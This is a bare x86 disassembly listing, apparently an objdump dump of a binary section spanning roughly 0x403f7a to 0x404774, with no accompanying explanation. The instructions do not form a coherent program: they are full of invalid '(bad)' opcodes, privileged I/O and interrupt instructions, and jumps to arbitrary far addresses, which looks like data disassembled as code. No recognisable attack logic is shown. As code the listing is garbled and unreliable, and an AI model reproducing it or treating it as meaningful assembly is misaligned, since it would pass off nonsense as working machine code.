  403f7a:	xchg   edx,eax
  403f7b:	pop    ecx
  403f7c:	mov    dl,0x43
  403f7e:	jle    0x403f9e
  403f80:	mov    ?,edx
  403f82:	adc    eax,0x8cb8f26c
  403f87:	push   ebx
  403f88:	fs daa 
  403f8a:	arpl   di,ax
  403f8c:	mov    ecx,0xccf96036
  403f91:	loope  0x403f33
  403f93:	jno    0x403fb8
  403f95:	sbb    DWORD PTR [ebx-0xab314a5],esp
  403f9b:	push   cs
  403f9c:	adc    BYTE PTR [ecx],dh
  403f9e:	dec    esi
  403f9f:	aad    0x70
  403fa1:	ins    BYTE PTR es:[edi],dx
  403fa2:	cmp    DWORD PTR [eax],ebp
  403fa4:	leave  
  403fa5:	mov    ebp,DWORD PTR [esi]
  403fa7:	cli    
  403fa8:	xchg   DWORD PTR [edi-0x36c3773c],ecx
  403fae:	jnp    0x404007
  403fb0:	lahf   
  403fb1:	shl    DWORD PTR [ecx],1
  403fb3:	dec    esp
  403fb4:	leave  
  403fb5:	rcr    DWORD PTR [ebx-0x10e0518c],0x98
  403fbc:	push   eax
  403fbd:	(bad)  
  403fbe:	icebp  
  403fbf:	ret    
  403fc0:	cmp    ebp,edx
  403fc2:	out    0xf5,eax
  403fc4:	mov    esp,0xb99985ef
  403fc9:	test   eax,0x27b2e66c
  403fce:	sub    edx,DWORD PTR [esi+edx*4-0x6eb06ab5]
  403fd5:	mov    edx,ecx
  403fd7:	adc    ebp,ebp
  403fd9:	sub    dh,BYTE PTR [edi-0xe916612]
  403fdf:	adc    ah,BYTE PTR [edi+0x3c]
  403fe2:	mov    cl,0xa
  403fe4:	mov    edi,0xfc08c9cb
  403fe9:	in     al,dx
  403fea:	add    DWORD PTR [ebx+0x6e],0xffffffed
  403fee:	sti    
  403fef:	out    0xc8,eax
  403ff1:	jle    0x403fee
  403ff3:	std    
  403ff4:	xor    eax,0x9a0530e3
  403ff9:	push   edx
  403ffa:	xlat   BYTE PTR ds:[ebx]
  403ffb:	fstp   QWORD PTR [ecx+0x34e58cf0]
  404001:	adc    ecx,DWORD PTR ds:0x6943e2cb
  404007:	inc    esp
  404008:	xchg   ebx,eax
  404009:	pop    ecx
  40400a:	dec    esp
  40400b:	call   0x365824c9
  404010:	cmc    
  404011:	xlat   BYTE PTR ds:[ebx]
  404012:	sbb    eax,0x27fca1f4
  404018:	pop    ebx
  404019:	scas   eax,DWORD PTR es:[edi]
  40401a:	aas    
  40401b:	mov    edi,DWORD PTR [ecx-0x22e7440f]
  404021:	sbb    edx,DWORD PTR [ecx+edi*2]
  404024:	arpl   bp,cx
  404026:	xor    dl,dh
  404028:	push   ebp
  404029:	or     al,0x31
  40402b:	hlt    
  40402c:	mov    ebx,0xb3d5effb
  404031:	repz adc dl,dl
  404034:	shl    BYTE PTR [esi-0xb],cl
  404037:	adc    DWORD PTR [edi],ebp
  404039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40403a:	pop    ecx
  40403b:	or     esi,DWORD PTR [esi+0x5b]
  40403e:	push   edi
  40403f:	jns    0x4040ae
  404041:	js     0x403fcb
  404043:	sbb    al,0xaf
  404045:	mov    bl,0xbc
  404047:	cmp    eax,DWORD PTR [eax+0x42]
  40404a:	sbb    eax,0xe96dac82
  40404f:	jg     0x404034
  404051:	inc    edx
  404052:	in     eax,dx
  404053:	test   BYTE PTR ds:0xc6371b61,bl
  404059:	xchg   edi,eax
  40405a:	mov    al,ds:0x279698a0
  40405f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404060:	mov    eax,0xa6c25743
  404065:	dec    eax
  404066:	gs test edi,edx
  404069:	cmp    al,0xc4
  40406b:	std    
  40406c:	mov    WORD PTR [eax+ecx*8+0x386b5c70],cs
  404073:	and    eax,0xcaead922
  404078:	pop    ebx
  404079:	sbb    BYTE PTR [eax+0x7f],0xcb
  40407d:	stos   BYTE PTR es:[edi],al
  40407e:	sub    al,0x53
  404080:	pop    edx
  404081:	xor    BYTE PTR [eax+edi*1+0x53],al
  404085:	pop    ebx
  404086:	pop    ecx
  404087:	sbb    bl,BYTE PTR ds:0x8341af7
  40408d:	push   cs
  40408e:	std    
  40408f:	ror    bh,cl
  404091:	rcl    BYTE PTR [ebx],0x5a
  404094:	fwait
  404095:	enter  0x4686,0x36
  404099:	cs mov edi,ebx
  40409c:	dec    ebx
  40409d:	push   0xa4209c85
  4040a2:	cli    
  4040a3:	ror    DWORD PTR [esp+esi*4+0x69],cl
  4040a7:	cld    
  4040a8:	retf   
  4040a9:	cmp    BYTE PTR [esi],0x21
  4040ac:	mov    esp,0x626927c5
  4040b1:	mov    ds:0x5ecfa8c,eax
  4040b6:	icebp  
  4040b7:	test   eax,0x7ee85edb
  4040bc:	lock ins BYTE PTR es:[edi],dx
  4040be:	mov    ebp,0x855a1ccc
  4040c3:	or     eax,0x187487e9
  4040c8:	or     BYTE PTR [esp+eax*8],bh
  4040cb:	cmp    eax,0xefc5a300
  4040d0:	stc    
  4040d1:	adc    esp,esi
  4040d3:	dec    edx
  4040d4:	(bad)  
  4040d5:	retf   0xbadf
  4040d8:	fs push cs
  4040da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040db:	inc    edx
  4040dc:	and    eax,0x3fe551fe
  4040e1:	aad    0xef
  4040e3:	mov    ds:0x3ac0ae58,eax
  4040e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040e9:	jl     0x4040a1
  4040eb:	inc    edx
  4040ec:	ss or  al,cl
  4040ef:	jmp    0x373d:0x7d28ece9
  4040f6:	retf   
  4040f7:	pop    eax
  4040f8:	daa    
  4040f9:	inc    eax
  4040fa:	lods   eax,DWORD PTR ds:[esi]
  4040fb:	inc    ebx
  4040fc:	or     al,0x2b
  4040fe:	stc    
  4040ff:	retf   
  404100:	dec    ecx
  404101:	jo     0x404093
  404103:	cs jno 0x4040dc
  404106:	push   esp
  404107:	mov    esi,0xe40c351f
  40410c:	jno    0x404178
  40410e:	test   al,0xde
  404110:	mov    ds,WORD PTR [ebp+0x6d945756]
  404116:	lods   eax,DWORD PTR ds:[esi]
  404117:	std    
  404118:	pop    ecx
  404119:	ja     0x40411c
  40411b:	jmp    0x1c50:0x82e07a64
  404122:	retf   0xb873
  404125:	outs   dx,BYTE PTR ds:[esi]
  404126:	fwait
  404127:	mov    BYTE PTR [ebx-0x5f],cl
  40412a:	ret    
  40412b:	mov    ebp,DWORD PTR [edi]
  40412d:	jbe    0x4040bf
  40412f:	xchg   edi,eax
  404130:	je     0x404139
  404132:	dec    esp
  404133:	inc    ecx
  404134:	push   cs
  404135:	outs   dx,DWORD PTR ds:[esi]
  404136:	(bad)  
  404137:	cmp    BYTE PTR [edi],ah
  404139:	jbe    0x4041ad
  40413b:	pop    edi
  40413c:	mov    al,0x1
  40413e:	cld    
  40413f:	rcl    BYTE PTR [edi],0x85
  404142:	(bad)  
  404144:	(bad)  
  404146:	or     al,0xf0
  404148:	loop   0x40413b
  40414a:	fdiv   DWORD PTR [ebp-0x5d812d5c]
  404150:	adc    BYTE PTR [bx+di-0x7ae5],bh
  404155:	dec    eax
  404156:	mov    ebx,0xd1c44e81
  40415b:	push   esi
  40415c:	and    edx,DWORD PTR [edx-0x2f]
  40415f:	xchg   ecx,eax
  404160:	mov    bh,0x9c
  404162:	ret    
  404163:	gs cmp al,0x5
  404166:	pushf  
  404167:	ror    cl,1
  404169:	scas   eax,DWORD PTR es:[edi]
  40416a:	je     0x40415e
  40416c:	lods   al,BYTE PTR ds:[esi]
  40416d:	inc    ebx
  40416e:	mov    ch,0xaa
  404170:	rol    DWORD PTR [eax+0x745e00bc],cl
  404176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404177:	mov    ecx,0xa5d2aeb1
  40417c:	hlt    
  40417d:	cmp    ebx,ebx
  40417f:	push   eax
  404180:	mov    bl,0x8f
  404182:	test   eax,0x4defcb12
  404187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404188:	in     al,dx
  404189:	jl     0x40415f
  40418b:	push   esi
  40418c:	xchg   DWORD PTR [ebx],edi
  40418e:	pop    ebx
  40418f:	(bad)
  404193:	imul   edi,DWORD PTR [ebx+0x2f],0x43
  404197:	jle    0x4041ea
  404199:	das    
  40419a:	outs   dx,BYTE PTR ds:[esi]
  40419b:	mov    ch,0xfd
  40419d:	mov    ebp,DWORD PTR [eax-0x40]
  4041a0:	enter  0x422b,0xb3
  4041a4:	or     ch,BYTE PTR [ebp+0x36683af7]
  4041aa:	std    
  4041ab:	sbb    cl,BYTE PTR [esi-0x7b026816]
  4041b1:	inc    ecx
  4041b2:	mov    ah,0x57
  4041b4:	mov    esp,0x81e339a9
  4041b9:	pop    ss
  4041ba:	fadd   QWORD PTR [edx]
  4041bc:	cs je  0x404149
  4041bf:	ror    BYTE PTR [ebx-0x66],0x6
  4041c3:	inc    edx
  4041c4:	jb     0x404192
  4041c6:	cmp    bh,BYTE PTR [ebp+0x5086215]
  4041cc:	sub    DWORD PTR [ecx+0x18],ebx
  4041cf:	mov    bh,0x9a
  4041d1:	mov    al,ds:0xd0d031cf
  4041d6:	jl     0x4041ce
  4041d8:	push   edx
  4041d9:	pop    ebx
  4041da:	pop    edi
  4041db:	les    esp,FWORD PTR [ebx+0x2916997e]
  4041e1:	adc    bl,bl
  4041e3:	and    al,0x7d
  4041e5:	xor    eax,0xd326392b
  4041ea:	out    dx,al
  4041eb:	ret    0x2c31
  4041ee:	ret    
  4041ef:	mov    al,0x67
  4041f1:	loopne 0x4041ab
  4041f3:	adc    BYTE PTR ss:[edx-0x24],ah
  4041f7:	sub    eax,0x6dc85f5f
  4041fc:	fnstsw WORD PTR [edx+0x733beb3a]
  404202:	xor    eax,0xa0f254e5
  404207:	xor    bl,bl
  404209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40420a:	pop    ecx
  40420b:	popw   ds
  40420d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40420f:	push   ecx
  404210:	int    0x13
  404212:	push   cs
  404213:	out    dx,eax
  404214:	ins    BYTE PTR es:[edi],dx
  404215:	retf   0xe193
  404218:	sbb    eax,0xcb89ffd0
  40421d:	jb     0x404252
  40421f:	pop    ss
  404220:	mov    dl,0x22
  404222:	je     0x404264
  404224:	pushf  
  404225:	shl    BYTE PTR [esp+edi*1],cl
  404228:	stos   BYTE PTR es:[edi],al
  404229:	mov    WORD PTR [edi+0x5],ds
  40422c:	les    ebp,FWORD PTR gs:[edi-0x23e9ab91]
  404233:	int3   
  404234:	adc    dh,bl
  404236:	pushf  
  404237:	adc    BYTE PTR [ebp+0x11],0xf1
  40423b:	aam    0xb8
  40423d:	cmp    BYTE PTR [edi],bl
  40423f:	sub    eax,0xfa2e10d2
  404244:	mov    al,ds:0x79766fba
  404249:	dec    ebx
  40424a:	popf   
  40424b:	fst    DWORD PTR [ebp-0x5907385e]
  404251:	js     0x4042a0
  404253:	sub    DWORD PTR ds:[edi-0x5dc5f26],0x4c316f75
  40425e:	mov    al,fs:0x49659419
  404264:	scas   eax,DWORD PTR es:[edi]
  404265:	in     al,0x67
  404267:	push   cs
  404268:	fadd   QWORD PTR [eax+0x3c]
  40426b:	xchg   ecx,eax
  40426c:	and    BYTE PTR [esi],dl
  40426e:	shl    BYTE PTR [eax],cl
  404270:	push   ebx
  404271:	rcl    BYTE PTR [ebp-0xba76b60],0xc2
  404278:	dec    esp
  404279:	xchg   ah,al
  40427b:	out    0xfa,eax
  40427d:	es aas 
  40427f:	and    DWORD PTR [edi+0x7a249b12],edi
  404285:	add    eax,edx
  404287:	sbb    al,0x61
  404289:	repnz mov dl,0x2f
  40428c:	add    DWORD PTR [edx-0x2098a986],ecx
  404292:	mov    ecx,0x206a6d08
  404297:	adc    edx,DWORD PTR [ebx-0x1cec34d5]
  40429d:	jnp    0x40426e
  40429f:	test   DWORD PTR [edx-0x1800811c],edi
  4042a5:	out    dx,al
  4042a6:	dec    ebx
  4042a7:	cmp    DWORD PTR [ebx-0x14e4e6d6],eax
  4042ad:	push   cs
  4042ae:	stc    
  4042af:	xor    BYTE PTR [ebp+0x14],0x2c
  4042b3:	pusha  
  4042b4:	adc    al,0xb2
  4042b6:	push   edx
  4042b7:	xchg   edx,eax
  4042b8:	sbb    BYTE PTR [ecx],cl
  4042ba:	lock sub dh,BYTE PTR [edx+0x2d1e5ff5]
  4042c1:	int    0xd8
  4042c3:	data16 in al,0x9
  4042c6:	(bad)  
  4042c7:	xchg   ebx,eax
  4042c8:	fmul   QWORD PTR [eax]
  4042ca:	push   ss
  4042cb:	push   esp
  4042cc:	call   0x662:0xaf2425
  4042d3:	je     0x404293
  4042d5:	mov    esp,0x5d03a69e
  4042da:	adc    bl,BYTE PTR [ebp+0x3e6f284]
  4042e0:	add    BYTE PTR [edi+0x31],al
  4042e3:	xchg   esp,eax
  4042e4:	mov    ebp,0x87043a2c
  4042e9:	xor    BYTE PTR [esi+0x48f3bb6c],cl
  4042ef:	sbb    edx,DWORD PTR [ebx-0x113165b4]
  4042f5:	nop
  4042f6:	lahf   
  4042f7:	sub    bl,BYTE PTR [ebx+0x3b]
  4042fa:	push   esp
  4042fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042fc:	clc    
  4042fd:	les    ebp,FWORD PTR [esi]
  4042ff:	push   ss
  404300:	push   ds
  404301:	jg     0x404325
  404303:	imul   edx,ebx,0xd9f13a6f
  404309:	js     0x40438a
  40430b:	sub    esp,esi
  40430d:	mov    eax,ds:0xf3e08cf8
  404312:	sub    al,0xd6
  404314:	(bad)  
  404315:	xchg   esp,eax
  404316:	mov    ebx,0x9190b32f
  40431b:	push   ss
  40431c:	sbb    eax,0x9fb8fa60
  404322:	aas    
  404323:	pop    es
  404324:	ffreep st(0)
  404326:	out    dx,eax
  404327:	jbe    0x404304
  404329:	cmp    dh,BYTE PTR [ebx+0x4f]
  40432c:	mov    eax,0xaa1c5d4e
  404331:	nop
  404332:	pop    ebp
  404333:	mov    al,ds:0xf3b9ba26
  404338:	jns    0x4042ea
  40433a:	and    bl,dh
  40433c:	sub    BYTE PTR [edx-0xb572d7],0xc5
  404343:	mov    edi,0xf79c9395
  404348:	fwait
  404349:	or     bl,BYTE PTR [ecx+0x5d]
  40434c:	xor    edx,edi
  40434e:	cdq    
  40434f:	sbb    cl,bl
  404351:	sub    ebp,DWORD PTR [edx+0x67]
  404354:	fwait
  404355:	fwait
  404356:	mov    ds:0x73150e63,eax
  40435b:	shl    bh,cl
  40435d:	dec    ebx
  40435e:	mov    dh,0x6e
  404360:	jns    0x40439c
  404362:	or     DWORD PTR ds:0xa8bf0fe2,ebx
  404368:	jnp    0x40437f
  40436a:	sbb    dl,BYTE PTR [edi-0x4702eea0]
  404370:	push   ecx
  404371:	std    
  404372:	mov    eax,ds:0xf57574af
  404377:	in     eax,0x99
  404379:	sbb    DWORD PTR [edi-0x3b05e40b],edx
  40437f:	into   
  404380:	cmp    al,0xcd
  404382:	pusha  
  404383:	hlt    
  404384:	mov    al,0xed
  404386:	loop   0x4043b6
  404388:	inc    ebp
  404389:	inc    ecx
  40438a:	sbb    esp,esp
  40438c:	shl    DWORD PTR [edx],1
  40438e:	sbb    DWORD PTR [esi-0x64],0xffffffd5
  404392:	pusha  
  404393:	push   ds
  404394:	mov    edi,0x845af63f
  404399:	test   ch,0x94
  40439c:	fsub   QWORD PTR ds:[bx]
  4043a0:	pop    ebx
  4043a1:	adc    al,0x72
  4043a3:	fs adc bl,al
  4043a6:	and    DWORD PTR [esi],ebx
  4043a8:	pop    esi
  4043a9:	inc    esp
  4043aa:	(bad)  
  4043ab:	adc    eax,0x8e225140
  4043b0:	xor    BYTE PTR [eax],0x3d
  4043b3:	ret    
  4043b4:	add    edx,DWORD PTR [edx-0x375e9fde]
  4043ba:	ins    DWORD PTR es:[edi],dx
  4043bb:	clc    
  4043bc:	push   cs
  4043bd:	ja     0x4043b3
  4043bf:	add    al,0x47
  4043c1:	sub    ebx,DWORD PTR [ebx-0x3f2a0868]
  4043c7:	aam    0x32
  4043c9:	xchg   ebx,eax
  4043ca:	mov    al,0x82
  4043cc:	pusha  
  4043cd:	enter  0xfb0c,0xd5
  4043d1:	push   0xb49f431
  4043d6:	jp     0x40440a
  4043d8:	sub    DWORD PTR [ecx+0x38],0xe15d25a3
  4043df:	add    DWORD PTR [ecx-0x58],ebx
  4043e2:	sub    eax,0x8965c435
  4043e7:	adc    edi,DWORD PTR [ecx]
  4043e9:	mov    ebx,0x608bf99d
  4043ee:	jmp    0xb59e6f9d
  4043f3:	cmp    bl,BYTE PTR [esi+0x1a]
  4043f6:	loop   0x4043b3
  4043f8:	mov    edx,0x8eb0f731
  4043fd:	(bad)  
  4043fe:	(bad)  
  4043ff:	xor    DWORD PTR [edx+0x40fe72ef],esi
  404405:	add    esp,DWORD PTR [edi-0x6b]
  404408:	or     DWORD PTR [eax-0x5c1e50da],esp
  40440e:	xchg   ebx,eax
  40440f:	out    dx,eax
  404410:	outs   dx,DWORD PTR ds:[esi]
  404411:	call   0x45e8e741
  404416:	enter  0x7d3b,0x35
  40441a:	cld    
  40441b:	adc    ah,BYTE PTR [edi-0x21]
  40441e:	push   es
  40441f:	jp     0x404458
  404421:	mov    ch,0xf8
  404423:	stos   BYTE PTR es:[edi],al
  404424:	lods   eax,DWORD PTR ds:[esi]
  404425:	aaa    
  404426:	neg    BYTE PTR [ecx+0x1d8470f8]
  40442c:	pop    edx
  40442d:	jne    0x404441
  40442f:	ja     0x4043b1
  404431:	dec    edx
  404432:	jl     0x4043d6
  404434:	call   0x55a6:0x980805a
  40443b:	retf   
  40443c:	mov    BYTE PTR [edi-0x6a],bl
  40443f:	mov    ebx,edi
  404441:	in     al,dx
  404442:	fmul   DWORD PTR [ecx]
  404444:	adc    edx,edi
  404446:	fiadd  DWORD PTR [edi]
  404448:	add    eax,0x929a9690
  40444d:	(bad)  
  40444e:	imul   DWORD PTR [edi+0x59e620bc]
  404454:	gs shl edi,0x20
  404458:	and    dh,BYTE PTR [ebx-0x2f41ba04]
  40445e:	test   eax,0x7fee6318
  404463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404464:	and    edi,DWORD PTR [edx-0xda31e52]
  40446a:	inc    esp
  40446b:	mov    ebp,0xb17537f7
  404470:	sub    BYTE PTR [esi+0x46067670],dh
  404476:	fwait
  404477:	add    dh,cl
  404479:	call   0x5786:0xc25ab9bf
  404480:	or     edi,DWORD PTR ds:0x25459a47
  404486:	sub    DWORD PTR [eax+edx*4-0xf50e9fe],0xffffffc6
  40448e:	dec    eax
  40448f:	or     BYTE PTR [ecx+0x19],dh
  404492:	scas   eax,DWORD PTR es:[edi]
  404493:	mov    DWORD PTR [ecx-0x27e3ab8f],edx
  404499:	pop    ss
  40449a:	mov    ah,0xe5
  40449c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40449d:	jae    0x4044cd
  40449f:	(bad)  
  4044a0:	icebp  
  4044a1:	xchg   edx,eax
  4044a2:	mov    ds:0x674c7475,al
  4044a7:	fbld   TBYTE PTR [ebx-0x10]
  4044aa:	pop    ecx
  4044ab:	pop    esp
  4044ac:	bnd jo 0x404465
  4044af:	mov    al,ds:0xc109a9a
  4044b4:	mov    al,ds:0xe21a2baf
  4044b9:	cli    
  4044ba:	call   0x9f2fe902
  4044bf:	pop    ds
  4044c0:	mov    dh,0x67
  4044c2:	sbb    edx,DWORD PTR [ebx-0x592452ae]
  4044c8:	add    DWORD PTR [ebp-0x14f11476],ecx
  4044ce:	xchg   esp,eax
  4044cf:	(bad)  
  4044d0:	cmp    eax,0x51dba148
  4044d5:	mov    eax,0xf03445cd
  4044da:	pop    ebp
  4044db:	cmp    DWORD PTR [edx+0x10028351],0xffffffd9
  4044e2:	cwde   
  4044e3:	adc    eax,0xe9728f28
  4044e8:	aas    
  4044e9:	fwait
  4044ea:	dec    ebp
  4044eb:	dec    BYTE PTR [ecx]
  4044ed:	pusha  
  4044ee:	sub    cl,BYTE PTR [esi+esi*4-0x305ac94f]
  4044f5:	adc    DWORD PTR ss:[esi-0x1b7aa5ce],0x4a3d4191
  404500:	lods   eax,DWORD PTR ds:[esi]
  404501:	add    BYTE PTR [esi],al
  404503:	and    al,0x79
  404505:	dec    ebx
  404506:	enter  0x3934,0x43
  40450a:	mov    ch,0x7e
  40450c:	push   eax
  40450d:	sub    eax,0x4dd674ea
  404512:	pop    edi
  404513:	stos   DWORD PTR es:[edi],eax
  404514:	imul   ebx,DWORD PTR ds:0x703c078b,0x73be1a0c
  40451e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451f:	xor    al,bl
  404521:	add    al,0x64
  404523:	dec    ebx
  404524:	int    0x8c
  404526:	daa    
  404527:	mov    ah,0x68
  404529:	inc    esp
  40452a:	adc    esi,DWORD PTR [ecx]
  40452c:	(bad)  
  40452d:	xor    al,0x27
  40452f:	or     edx,esi
  404531:	xor    ch,cl
  404533:	mov    ds:0x29d43f01,eax
  404538:	mov    bh,0x7f
  40453a:	es scas al,BYTE PTR es:[edi]
  40453c:	pop    eax
  40453d:	repnz mov ch,0x49
  404540:	push   cs
  404541:	push   esi
  404542:	pop    esi
  404543:	call   0xcc7a:0xce9771c3
  40454a:	add    ah,bh
  40454c:	pushf  
  40454d:	mov    ecx,DWORD PTR [edi+ebx*2]
  404550:	out    dx,eax
  404551:	scas   al,BYTE PTR es:[edi]
  404552:	push   ss
  404553:	pop    esi
  404554:	ss dec esi
  404556:	or     bl,BYTE PTR [edx+0x779cc846]
  40455c:	xchg   ecx,eax
  40455d:	mov    es,WORD PTR [ebx]
  40455f:	stos   DWORD PTR es:[edi],eax
  404560:	add    ch,BYTE PTR [edi-0x3b]
  404563:	mov    al,ds:0x50aac50d
  404568:	cwde   
  404569:	adc    BYTE PTR [eax-0x1d847238],ch
  40456f:	shr    BYTE PTR [ecx],cl
  404571:	push   ebx
  404572:	(bad)  
  404573:	out    dx,eax
  404574:	jmp    0x4045bc
  404576:	call   0x523f62b0
  40457b:	jns    0x40455e
  40457d:	xchg   ecx,eax
  40457e:	outs   dx,BYTE PTR ds:[esi]
  40457f:	mov    edx,0x514b1843
  404584:	lods   eax,DWORD PTR ds:[esi]
  404585:	loope  0x404563
  404587:	ret    0x26aa
  40458a:	in     eax,0xe2
  40458c:	les    ecx,FWORD PTR [ebx-0x32bcc285]
  404592:	inc    edx
  404593:	dec    edx
  404594:	add    eax,0xa9fda940
  404599:	cdq    
  40459a:	add    DWORD PTR ds:0x890120c7,edx
  4045a0:	test   DWORD PTR [edi+0x6f],ecx
  4045a3:	jb     0x4045ca
  4045a5:	dec    esp
  4045a6:	neg    al
  4045a8:	scas   al,BYTE PTR es:[edi]
  4045a9:	jp     0x40452e
  4045ab:	aas    
  4045ac:	(bad)  
  4045ad:	into   
  4045ae:	(bad)  
  4045af:	lock inc edx
  4045b1:	add    ebp,DWORD PTR [esi+ebx*2+0x61]
  4045b5:	adc    al,0x37
  4045b7:	push   0x84c35c19
  4045bc:	jp     0x404616
  4045be:	cmp    edi,DWORD PTR [edx+0x4f64d169]
  4045c4:	pushf  
  4045c5:	dec    ebx
  4045c6:	adc    BYTE PTR [ebx-0x43],0x41
  4045ca:	mov    cl,0xee
  4045cc:	jp     0x4045ee
  4045ce:	pushf  
  4045cf:	daa    
  4045d0:	pop    ds
  4045d1:	(bad)  
  4045d2:	pop    ebx
  4045d3:	into   
  4045d4:	test   al,0x4f
  4045d6:	jnp    0x404612
  4045d8:	aas    
  4045d9:	jno    0x404590
  4045db:	push   ds
  4045dc:	leave  
  4045dd:	dec    ecx
  4045de:	ins    DWORD PTR es:[edi],dx
  4045df:	pop    es
  4045e0:	sbb    ebx,DWORD PTR [edi+0x62]
  4045e3:	rol    BYTE PTR [edx],0x73
  4045e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045e7:	and    dl,bl
  4045e9:	fwait
  4045ea:	add    eax,0x27bb834
  4045ef:	jg     0x4045de
  4045f1:	daa    
  4045f2:	es popf 
  4045f4:	iret   
  4045f5:	jmp    0xc1c1:0x92343e04
  4045fc:	jb     0x404643
  4045fe:	or     dl,dh
  404600:	cmp    ebp,DWORD PTR [ecx-0x49]
  404603:	and    BYTE PTR [edi],al
  404605:	mov    al,0x30
  404607:	cli    
  404608:	cwde   
  404609:	and    eax,0x7ee4e5bc
  40460e:	jne    0x404596
  404610:	and    BYTE PTR [edx],dl
  404612:	inc    ebp
  404613:	shl    al,cl
  404615:	je     0x404673
  404617:	in     al,dx
  404618:	retf   0xb8c8
  40461b:	adc    DWORD PTR [eax-0x2e],ecx
  40461e:	stc    
  40461f:	std    
  404620:	sub    DWORD PTR [ecx-0x72],eax
  404623:	xor    bl,BYTE PTR ds:0xdaaf71b
  404629:	fwait
  40462a:	mov    ch,0x22
  40462c:	mov    ds:0x348b02c6,al
  404631:	mov    ebp,0xf674195b
  404636:	sbb    ch,BYTE PTR ss:[ecx+edx*4]
  40463a:	sub    DWORD PTR [edx],esp
  40463c:	fadd   DWORD PTR [edi+edi*2-0x18a423d7]
  404643:	or     eax,0xef23bbff
  404648:	or     al,0xdb
  40464a:	addr16 mov ebp,0x61af01fa
  404650:	or     BYTE PTR [edx],bh
  404652:	push   0x8acd5428
  404657:	or     DWORD PTR [edx-0x31],edx
  40465a:	(bad)  [ebp+ecx*4-0x7e]
  40465e:	pop    es
  40465f:	pop    edi
  404660:	jb     0x404618
  404662:	mov    ah,0x2b
  404664:	adc    al,0xdc
  404666:	push   0xffffff93
  404668:	dec    esi
  404669:	sub    eax,0x88034a3f
  40466e:	jmp    0x63cf:0xda895f35
  404675:	xor    DWORD PTR [eax+0x36e5c6e5],0xffffffec
  40467c:	pop    ebp
  40467d:	cmp    BYTE PTR [ebx],al
  40467f:	outs   dx,BYTE PTR ds:[esi]
  404680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404681:	dec    ebp
  404682:	mov    DWORD PTR [ebx-0x74],ebx
  404685:	pushf  
  404686:	ins    BYTE PTR es:[edi],dx
  404687:	pop    esi
  404688:	fcomp  QWORD PTR [esi-0x5]
  40468b:	add    DWORD PTR [ecx],edi
  40468d:	in     al,dx
  40468e:	cwde   
  40468f:	stc    
  404690:	inc    esp
  404691:	mov    esi,esp
  404693:	sahf   
  404694:	push   ebx
  404695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404696:	cmp    al,0xc0
  404698:	gs (bad) 
  40469a:	loop   0x404642
  40469c:	nop
  40469d:	inc    edx
  40469e:	cmp    DWORD PTR ds:0x2ff61f30,0x133d58a8
  4046a8:	fidiv  DWORD PTR [ebp-0x67]
  4046ab:	jl     0x40467b
  4046ad:	pusha  
  4046ae:	fldcw  WORD PTR [ecx-0x44b5f6b6]
  4046b4:	xor    BYTE PTR [eax],al
  4046b6:	or     al,dl
  4046b8:	sbb    al,0xe4
  4046ba:	cli    
  4046bb:	fstp   DWORD PTR [esi]
  4046bd:	popf   
  4046be:	mov    al,ds:0x469136a4
  4046c3:	popf   
  4046c4:	int    0x30
  4046c6:	mov    edx,0xb8f38ef8
  4046cb:	push   cs
  4046cc:	sub    eax,0x78369987
  4046d1:	dec    ebx
  4046d2:	stos   DWORD PTR es:[edi],eax
  4046d3:	jnp    0x404693
  4046d5:	add    DWORD PTR [esi-0x3f],ebx
  4046d8:	fisubr WORD PTR [eax+0x28]
  4046db:	aam    0x19
  4046dd:	cmp    ch,cl
  4046df:	push   ecx
  4046e0:	cmp    BYTE PTR [ebx-0x4968c47e],dl
  4046e6:	lods   al,BYTE PTR ds:[esi]
  4046e7:	outs   dx,BYTE PTR ds:[esi]
  4046e8:	call   0x9a436eca
  4046ed:	ficom  WORD PTR [ebp+0x66d8424f]
  4046f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f4:	pop    es
  4046f5:	mov    ecx,0x3e2d5c3f
  4046fa:	std    
  4046fb:	cmp    ch,bh
  4046fd:	(bad)  
  4046fe:	jbe    0x404732
  404700:	xchg   esi,eax
  404701:	pop    ds
  404702:	and    edx,0xffffffa1
  404705:	dec    eax
  404706:	scas   eax,DWORD PTR es:[edi]
  404707:	pusha  
  404708:	(bad)
  40470d:	xchg   DWORD PTR [esi-0x73101f95],ebx
  404713:	jg     0x404768
  404715:	(bad)  
  404716:	pop    ebp
  404717:	pop    ebp
  404718:	sbb    ecx,DWORD PTR ds:0xb81634d7
  40471e:	push   esi
  40471f:	imul   ecx,ebx,0xffffffaa
  404722:	pop    ds
  404723:	mov    ds:0xc1aef0a5,eax
  404728:	add    dl,BYTE PTR [ebx+ebx*2]
  40472b:	out    dx,al
  40472c:	jge    0x404775
  40472e:	and    DWORD PTR [ebx+0x49],0x8ec2f64a
  404735:	pop    es
  404736:	es shl cl,1
  404739:	push   es
  40473a:	leave  
  40473b:	pop    esi
  40473c:	mov    ds:0xa10b4203,eax
  404741:	pop    ecx
  404742:	pop    edi
  404743:	ret    
  404744:	mov    WORD PTR [ecx+edx*4+0x2469b6c5],gs
  40474b:	push   0x699e52b4
  404750:	pop    edi
  404751:	inc    ecx
  404752:	inc    edx
  404753:	cdq    
  404754:	mov    WORD PTR [ebx],?
  404756:	dec    ebp
  404757:	std    
  404758:	inc    ebx
  404759:	add    ebp,eax
  40475b:	in     eax,dx
  40475c:	and    BYTE PTR [edx+0x75],cl
  40475f:	idiv   dl
  404761:	inc    edx
  404762:	mov    ch,0xb3
  404764:	imul   ecx,DWORD PTR [ecx+edi*4],0x7149517a
  40476b:	jae    0x40479d
  40476d:	adc    bl,cl
  40476f:	jmp    0x6acd1ec4
  404774:	cmp    al,0xac
